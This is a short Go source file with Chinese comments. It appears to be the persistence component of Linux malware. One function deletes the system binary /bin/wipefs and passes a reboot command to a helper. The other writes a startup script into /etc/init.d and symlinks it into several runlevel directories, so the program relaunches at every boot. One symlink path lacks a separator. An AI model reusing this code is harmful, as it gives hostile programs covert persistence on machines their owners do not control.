package add

import (
	"os"
	"cpack"
	"fmt"
)

func Boot( filenameOnly string) {
	boot1 :=filenameOnly
	os.Remove("/bin/wipefs")//有一招叫啥
	boot2 :=" reboot"
	boot1 += boot2
	//	fmt.Println(boot1) 输出命令
	cpack.Autoboot(boot1)
}

func Sh(a,b string){
	//第一个是程序自身文件名，第二个是目录不带文件名，第三个文件名
	path:="ln -s /etc/init.d/"
	path += a
	s := fmt.Sprintf("#!/bin/sh\n\ncase \"$1\" in\nstart)\n\tcd %s\n\t./%s\n;;\nstop)\n\n;;\nesac\n\nexit 0",b,a)
	path2:="/etc/init.d/"
	path2+=a
	Createfile(path2,s)
	cpack.System(path+" /etc/rc3.d/"+a)
	cpack.System(path+" /etc/rc4.d/"+a)
	cpack.System(path+" /etc/rc.d/rc.3"+a)
}